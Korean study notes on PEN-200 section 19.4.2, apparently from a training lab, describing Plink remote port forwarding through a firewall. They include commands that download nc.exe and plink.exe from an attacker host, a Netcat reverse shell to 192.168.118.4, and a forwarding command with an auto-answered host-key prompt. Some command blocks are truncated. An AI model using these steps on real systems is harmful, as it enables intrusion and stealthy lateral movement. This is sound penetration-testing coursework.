# 19.4.2 Plink

> **Plink** · PEN-200 §19.4.2

관리자가 OpenSSH 를 남겨두지 않았을 수 있어 `ssh.exe` 가 있다는 보장은 없음. 그래도 관리자에게는 원격 관리 도구가 필요하고, OpenSSH 가 Windows 에 흔해지기 전의 표준이 **PuTTY** 와 그 커맨드라인 전용 판인 **Plink** 였음.

공격자 관점의 이점은 은밀함임 — 관리자에게 흔한 정상 도구라 전통적 안티바이러스가 잘 표시하지 않음. 같은 기능의 보안 계열 도구보다 눈에 덜 띔. 평가 상황에서는 GUI 보다 셸을 쥘 확률이 높아 PuTTY 가 아니라 Plink 를 씀.

⚠️ **함정 — Plink 에는 원격 «동적» 포워딩이 없음.** OpenSSH 클라이언트 기능 대부분을 갖췄지만 이 하나가 빠져 있어, 앞 절의 `-R <포트>` 한 개짜리 문법을 그대로 옮기려 하면 막힘.

시나리오는 MULTISERVER03 이 TCP/80 웹앱만 노출하고 나머지 인바운드를 방화벽이 막은 상황임 — RDP 직접 접속이 불가하고 OpenSSH 도 제거돼 있음. 남은 길은 웹앱을 뚫은 뒤 Plink 로 **원격 포워딩**을 만들어 MULTISERVER03 의 RDP 포트를 Kali 쪽으로 끌어오는 것임.

![[PEN200-Fig-282.png]]
*80 만 열린 방화벽 뒤의 MULTISERVER03*

**1단계 — 대화형 리버스셸 확보.** 사전 침해로 `/umbraco/forms.aspx` 에 웹셸이 올라가 있고 실행 계정은 `iis apppool\defaultapppool` 임. 웹셸은 명령을 한 발씩 던지는 것뿐이라 터널을 유지할 수 없어, 먼저 `nc.exe` 로 제대로 된 셸을 잡음.

Kali 에서 `sudo systemctl start apache2` 로 웹서버를 띄우고 `/usr/share/windows-resources/binaries/nc.exe` 를 `/var/www/html/` 로 복사함. 그다음 웹셸에서 PowerShell 한 줄로 내려받음 — `-Uri` 가 출처, `-OutFile` 이 저장 경로임.

```
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali:
kali@kali:~$
```

*Kali 의 Apache2 기동*

```
kali@kali:~$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

*`nc.exe` 를 찾아 Apache 웹루트로 복사*

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

Kali 에 `nc -nvlp 4446` 리스너를 띄운 뒤, 웹셸에서 `-e` 로 `cmd.exe` 를 붙여 되돌려 보냄.

```
kali@kali:~$ nc -nvlp 4446
listening on [any] 4446 ...
```

*Kali 에 Netcat 리스너 기동 (4446)*

```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

**2단계 — Plink 배포.** 같은 방식으로 `plink.exe` 를 Apache 웹루트에 올리고, 리버스셸에서 PowerShell 한 줄로 `C:\Windows\Temp` 에 내려받음.

```
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali:
kali@kali:~$
```

```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -
OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
c:\windows\system32\inetsrv>
```

*리버스셸에서 `plink.exe` 를 대상의 `C:\Windows\Temp` 로 내려받음*

**3단계 — 원격 포워딩 생성.** 문법은 OpenSSH 클라이언트와 거의 같음. `-R` 뒤에 **Kali SSH 서버에 열 소켓**과 **MULTISERVER03 루프백의 전달 대상**을 순서대로 적고, 사용자명은 `-l`, 비밀번호는 `-pw` 로 커맨드라인에 직접 넘김.

```

HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

⚠️ **`-pw` 는 Kali 비밀번호를 대상 호스트의 명령 이력이나 프로세스 목록에 남김.** 적대적 네트워크라면 Kali 에 포워딩 전용 계정을 따로 만들어 그 자격 증명만 노출시킬 것.

⚠️ **호스트 키 캐시 프롬프트가 걸림돌이 됨.** Linux 에서 비 TTY 셸로 SSH 키 확인에 답하지 못하는 것과 같이, 아주 제한적인 셸에서는 `Store key in cache? (y/n...)` 에 응답할 수 없음. 해법은 확인 입력을 파이프로 밀어넣는 것 — plink 명령 앞에 `cmd.exe /c echo y` 를 파이프로 연결해 평소 손으로 치던 `y` 를 대신하게 함. 전체 명령은 `cmd.exe /c echo y | ..exe - ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7` 임.

> ⚠️ **교재 오류** — 위 명령의 `..exe` 는 교재 지면에 인쇄된 그대로이며 실제로는 `plink.exe` 를 가리킴. 명령 문자열 자체는 원문 그대로 두고 표시만 붙임.

Kali 에서 `ss -ntplu` 로 보면 `127.0.0.1:9833` 이 루프백에 열려 있음.

```

tcp   LISTEN 0      128             [::]:22           [::]:*

```
